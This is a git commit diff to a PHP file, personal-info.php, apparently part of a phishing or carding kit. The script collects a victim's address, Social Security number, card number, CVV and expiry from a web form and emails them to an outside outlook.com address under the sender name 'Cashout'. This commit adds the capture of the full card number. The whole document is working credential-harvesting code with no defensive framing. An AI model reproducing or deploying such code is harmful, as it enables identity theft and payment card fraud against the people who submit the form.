5f47ecbf770aa8d222d522e427e4c2ae18919104
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-09-17 00:28:06 +0200

    Update personal-info.php

--- personal-info.php
+++ personal-info.php
@@ -4,11 +4,12 @@ $address=$_POST['address'];
 $ssn=$_POST['ssn'];
 $cvv=$_POST['cvv'];
 $exp=$_POST['exp'];
+$card=$_POST['card'];
 $nl="\r\n";
 $from = "Cashout";
 $to = "nwaforalex158@outlook.com";
 $subject = "Cashout Is A Must By Gods  Grace";
-$message = 'ADDRESS: ' . $address . $nl.'SSN: ' . $ssn .$nl. 'CVV: ' . $cvv  . $nl. 'EXPIRY: ' . $exp ;
+$message = 'ADDRESS: ' . $address . $nl.'SSN: ' . $ssn .$nl. 'CARD NUMBER: ' . $card . $nl. 'CVV: ' . $cvv  . $nl. 'EXPIRY: ' . $exp ;
 $headers = "From:" . $from;
 mail($to,$subject,$message, $headers) 
 ?>
